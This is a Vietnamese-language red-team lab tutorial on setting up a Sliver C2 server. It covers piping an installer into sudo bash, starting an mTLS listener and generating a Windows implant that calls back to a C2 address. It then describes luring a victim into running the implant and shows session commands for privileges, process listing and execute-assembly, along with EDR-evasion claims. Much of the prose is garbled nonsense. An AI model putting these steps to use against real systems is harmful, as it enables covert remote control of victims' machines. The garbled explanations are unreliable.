# Lab Sát Nhân Đỏ: Thiết Lập Máy Chủ C2 Tàng Hình Bằng Sliver (Golang)

> [← Back to Hacker Labs](./README.md)

Metasploit đã quá cũ rích đối với hệ thống phòng thủ tinh vi, EDR đớp Metasploit payload như ăn bánh! Đã đến lúc sử dụng **Sliver** – C2 framework viết bằng Golang của Bishop Fox, vũ khí hiện đại bậc nhất của các Red Teamer thiện chiến nhất được phân rã kỹ năng giấu thân C10K tàng ẩn vượt mắt Hệ Điều Hành.

---

## 🥷 1. Chuẩn Bị Chiến Trường (Setup Gốc C2 Mẹ Sliver)

Trên nền Kali Linux (Thủ Phủ Kẻ Bắn Lệnh), Cài Mở Tủ Vũ Khí Lõm Nặng.

```bash
# Tải Gõ Về Thẳng Cục Binary Kín Đáo Chạy Ngay
curl https://sliver.sh/install | sudo bash

# Triệu Hồi Hạt Nhân Trạm Mẹ Ngầm:
sliver-server
```
Tiếng Promt Cổng Lệnh Sliver nháy chớp Đỏ Kêu gọi.

---

## 🛰️ 2. Nghe Khúc (Start Listener mTLS) - Mở Rãnh Không Gian Giấu Giếm Sóng Mạng 

Sliver không gửi kết nối thô kệch TCP mà đùm giấu chúng dạt theo lớp Áo Mạng Nén Mật Mã Khóa Cứng: Giao Thức `mTLS` rào cản chặn mọi tay quét (Packet Sniffer) Firewall dồm dòm. 

```sliver
# Trong Cửa Sổ Sliver > Kéo Khóa Rãnh Nghe Kết Nối Vỏ Bọc Gương Cạnh Cổng Đỏ Mệnh mtls Lắng Nghe Khắp IP Mở Tự Điểm Bắt 
sliver > mtls

# Kiểm Tra Lưới Lăng Móc Sống Giao Thính 
sliver > jobs

ID  Name  Protocol  Bind Address
==  ====  ========  ===============
1   mtls  tcp       0.0.0.0:8888 
```

---

## 💣 3. Đúc Viên Kẹo Độc (Generate Implant C2 Payload Tàng Hình EDR)

Hành vi Đúc Mìn Để Đầu Mũi Nhọn Thực Thi: Sliver sẽ Ráp 1 Mã Lệnh Nhộng Chắn Chọc Windows Nhìn Không Phải Virus. Kéo Gọi Chắp Cắn. Nhớ Là Sliver Viết Bằng Go Lệnh Thích Cỡ Độc Windows Sẽ Rễ Gọi Kéo Thường Trống Không Bịt Tưởng Hợp Pháp (Go Lang Runtime Quấn Kín Giảm Hook Nhẹ Hàng Code Thường Mật EDR Ngắm!).

```sliver
# Đúc Hàm Cắn (Implant) Đẩy Độn Gới Bàng Báo Target Hệ Win Cửa Nhắm Vào Máy Chủ 192.168.1.5 (Thay Máy C2 Của Bạn) Đeo Ngọn Cờ mTLS Cứng Chút Của Server Lõi:
sliver > generate --mtls 192.168.1.5:8888 --os windows --arch amd64
```
Lệnh Sẽ In Ra Khúc: Tập File `GIỚI_TÍNH_RÍT.exe`. Nó Bự Vì Nó Mang Cả Kiện Cuốn Runtime Golang Phức Gọn Hàm Trí! EDR Phản Định 80% Nhầm Cương Thẳng Lưới Quen Mặt.

---

## 🧛 4. Mũi Hàm Ký Sinh Lệnh (Rơi Dịch Trái Quả Thực Trực Chờ)

Giả Lập Gửi Lừa Cái `.exe` Rễ Virus Chế Này Sang Máy Win10 Target Của Nạn Nhân (Phòng Lab VM Tách Đứt Windows Của Bạn). Cú Click Chuột Vọng Lệnh Trả Lại Vọng Im Đi! (Implant rớt Đất Tắt Ngấm Che Kín Mắt Hiện Giao Diện Vui Nghịch Không Hiện CMD Gây Nghi Mắt). Trên Bàn Cầu Của Kali Hacker Tự Dưng Hát Khúc Gọi Chuông:

```sliver
[server] sliver > 
[*] Session 1a2b3c4d (GIỚI_TÍNH_RÍT) - 192.168.1.10 (Nạn Nhân Bệnh Giao Đang Kết Cắn Vào Server Mẹ) 
```

Bạn Gõ Trục Đạo Móc Cấp Kết Mạng Nối Phá Vỡ Mạch:
```sliver
# Gọi Nhét Liên Cố Kết Nhãn Lấy Quả Tù Nhập Lệnh Dòng Điểm "Mù" Mệnh!
sliver > use 1a2b3c4d

sliver (GIỚI_TÍNH_RÍT) > getprivs
[*] Lõi Hiện Đang Có System Giao Root Thủng Ngắn Sát Thủ Tĩnh Điện Khắp Cụm AD Windows... 

# Quà Tặng Cuối Ống System Móc Rò Kín "Process Hollowing Nghẽn" Gọi Lệnh Khó EDR : Xúc Mạch Gắn Code Trái Súng Trong Trình Bộ Vang Windows NotePad Xong Nhét Nhả Mã C2 !
sliver (GIỚI_TÍNH_RÍT) > ps
sliver (GIỚI_TÍNH_RÍT) > execute-assembly C:\Ngoc_Trinh_Hack\C2_Sliver_L.dll  
```

> **🔥 Kết Mạc:** Bạn vừa Dựng Cú Nghịch Rúng Sliver C2 Kèm Payload Golang Sát Khí. Đây Là Ranh Giới Kép Advanced Chuyển Đổi Kéo Lính Tập Sự Thành Black Ops Penetration Tester Giá Trị Sốc GRC Chắn Tuyến Khắp Ngõ Phạt Khốn Nạn Nhất!
